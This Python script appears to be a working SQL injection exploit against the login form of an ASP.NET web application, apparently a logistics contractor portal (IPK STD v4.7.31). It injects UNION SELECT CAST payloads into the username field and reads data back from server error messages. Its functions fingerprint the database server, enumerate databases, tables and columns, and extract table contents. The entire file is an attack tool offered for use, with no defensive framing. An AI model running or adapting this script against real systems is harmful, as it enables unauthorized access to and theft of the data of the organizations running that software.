from bs4 import BeautifulSoup
import requests
import re
import logging

PAYLOAD = {
    "__EVENTTARGET": "",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": "/wEPDwUJNjIyODA5NDI4D2QWAmYPZBYCAgMPZBYGAgUPPCsABAEADxYCHgVWYWx1ZQU6Q29weXJpZ2h0IMKpIFNvZnR3YXJlIFNvbHV0aW9ucyAyMDIyIC0gYWxsIHJpZ2h0cyByZXNlcnZlZGRkAgkPPCsABAEADxYCHwAFHFBsYXRmb3JtYSBsb2dpc3R5Y3puYSBBTlRFRU9kZAINDzwrAAQBAA8WAh8ABT1JbnRlcm5ldG93eSBQdWxwaXQgS29udHJhaGVudGEgLSBJUEsgU1REIHY0LjcuMzEgKE9OLVBSRU1JU0UpZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgUFLmN0bDAwJE1haW5Db250ZW50UGxhY2VIb2xkZXIkQVNQeENvbWJvQm94MSREREQFJmN0bDAwJE1haW5Db250ZW50UGxhY2VIb2xkZXIkYnRuUG9saXNoBSdjdGwwMCRNYWluQ29udGVudFBsYWNlSG9sZGVyJGJ0bkVuZ2xpc2gFJ2N0bDAwJE1haW5Db250ZW50UGxhY2VIb2xkZXIkYnRuUnVzc2lhbgU3Y3RsMDAkTWFpbkNvbnRlbnRQbGFjZUhvbGRlciRBU1B4Q2FsbGJhY2tQYW5lbCRidG5Mb2dpbtC5tpNjoF4CLo3cUQ2zEWUSs5KoukWFBgWF3xeb61i7",
    "__VIEWSTATEGENERATOR": "CA0B0334",
    "ctl00$MainContentPlaceHolder$isCookieErased": "",
    "ctl00_MainContentPlaceHolder_ASPxComboBox1_VI": "",
    "ctl00$MainContentPlaceHolder$ASPxComboBox1": "",
    "ctl00$MainContentPlaceHolder$ASPxComboBox1$DDDState": "{\"windowsState\":\"0:0:-1:0:0:0:-10000:-10000:1:0:0:0\"}",
    "ctl00$MainContentPlaceHolder$ASPxComboBox1$DDD$L$State": "{\"CustomCallback\":\"\"}",
    "ctl00$MainContentPlaceHolder$ASPxComboBox1$DDD$L": "",
    "ctl00$MainContentPlaceHolder$ASPxCallbackPanel$errorPanel": "{\"collapsed\":false}",
    "ctl00$MainContentPlaceHolder$ASPxCallbackPanel$UsrAuthLogin": "",
    "ctl00$MainContentPlaceHolder$ASPxCallbackPanel$UsrAuthStr": "",
    "DXScript": "1_10,1_11,1_22,1_62,1_12,1_13,1_179,1_180,1_20,1_21,1_186,1_14,1_16,1_182,1_189,1_40,1_178,1_47,1_8,1_37",
    "DXCss": "1_206,1_203,1_66,1_67,1_68,1_205,1_202,1_72,1_71,0_5551,0_5556,./Styles/webstyle_02.css,0_5390,0_5394,0_768",
    "__CALLBACKID": "ctl00$MainContentPlaceHolder$ASPxCallbackPanel",
    "__CALLBACKPARAM": "c0:[object Object]",
    "__EVENTVALIDATION": "/wEdAAT4DOMoxOcseDWsO1C6uXQJNDREO7djuGhqk8FVsJfNmMwBALscl5EfEu8ZdKJq2NyGdRCW7iPDICadVN9OSkl3pAQEPFdgfHxQ3ZZ8DhEmxrnS2vKeNxv2Ca9prtuXqYA="
}

COOKIES = {
    'siteLang': 'en'
}




def send_query(target:str,query:str):
    PAYLOAD['ctl00$MainContentPlaceHolder$ASPxCallbackPanel$UsrAuthLogin']= "' UNION SELECT CAST(({}) AS int),null,null  --".format(query)
    resp = requests.post("{}/default.aspx".format(target),data=PAYLOAD, cookies=COOKIES)
    # print(resp.text)
    return format_response(resp)

def is_vulnerable(target:str):
    query = "select"
    result = send_query(target,query)
    logging.debug("Checking if target is vulnerable: {}".format(result))
    return not is_done(result)

def get_target_info(target:str):
    result = {
        "version": "",
        "servername": "",
        "language": "",
        "user": "",
        "current_db": "",
        "hostname": "",
        "domain": "",
    }
    # Useful information to get from the target
    result['version'] = (send_query(target,"select @@version"))
    result['servername'] =(send_query(target,"select @@servername"))
    result['language'] =(send_query(target,"select @@language"))
    result['user'] =(send_query(target,"select user"))
    result['current_db'] = (send_query(target,"select db_name()"))
    result['hostname'] = (send_query(target,"select host_name()"))
    result['domain'] = (send_query(target,"SELECT DEFAULT_DOMAIN()"))
    logging.debug("Target info: {}".format(result))

    return result


def format_response(response:str):
    soup = BeautifulSoup(response.text, 'html.parser')
    out=soup.find('span', id='ctl00_MainContentPlaceHolder_ASPxCallbackPanel_errorPanel_errorLabel')
    logging.debug("Response: {}".format(out.text))
    result = re.sub(r"Unexpected error\.Conversion failed when converting the (\w+) value '","",out.text)
    result = re.sub(r"' to data type (\w+)\.","",result)
    return result

def is_done(result:str):
    return "Unexpected error.No permissions to login." == result

def get_all_db(target):
    count = 0+1
    list_of_dbs = []
    keep_going = True
    while keep_going:
        query = "select DB_NAME({})".format(count)
        result = send_query(target,query)
        keep_going = not is_done(result)
        if keep_going:
            list_of_dbs.append(result)
            count += 1
    logging.info("Done enumerating dbs. Number of tables found: {}".format(count-1))
    logging.info("Databases found: {}".format(list_of_dbs))
    return list_of_dbs

def get_current_db(target):
    query = "select DB_NAME()"
    return send_query(target,query)

def get_db_table_schema(target,db_name):
    table_schema = []
    keep_going = True
    count = 0
    while keep_going:
        types = ["TABLE_CATALOG","TABLE_SCHEMA","TABLE_NAME","TABLE_TYPE"]
        table_info ={
            "TABLE_CATALOG": "",
            "TABLE_SCHEMA": "",
            "TABLE_NAME": "",
            "TABLE_TYPE": ""
        }
        for type in types:
            query = "SELECT {} FROM {}.INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY".format(type,db_name,count)
            result = send_query(target,query)
            logging.debug("QUERY: {}".format(query))
            if is_done(result) or re.match(r'Unexpected error.The server principal "(\w+)" is not able to access the database "(\w+)" under the current security context\.', result):
                keep_going = False
                break
            if type == types[0]:
                table_info["TABLE_CATALOG"] = result
            if type == types[1]:
                table_info["TABLE_SCHEMA"] = result
            if type == types[2]:
                table_info["TABLE_NAME"] = result
            if type == types[3]:
                table_info["TABLE_TYPE"] = result
        if keep_going:
            count += 1
            logging.info(table_info)
            table_schema.append(table_info)
    return table_schema


def get_table_column(target,db,table):
    table_column = []
    keep_going = True
    count = 0
    while keep_going:
        query = "SELECT COLUMN_NAME FROM {}.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{}' ORDER BY COLUMN_NAME OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY".format(db,table,count)
        result = send_query(target,query)
        if is_done(result):
            keep_going = False
            break
        logging.info("Found column: {}".format(result))
        table_column.append(result)
        count += 1
    return table_column

def get_column_content(target,db,table_schema,table,fixed_column,column):
    keep_going = True
    count = 0
    while keep_going:
        query = "SELECT {} FROM {}.{}.{} ORDER BY {} OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY".format(column,db,table_schema,table,fixed_column,count)
        result = send_query(target,query)
        if is_done(result):
            keep_going = False
            break
        logging.info("Content found on table {} column {}: {}".format(table,column,result))
        count += 1
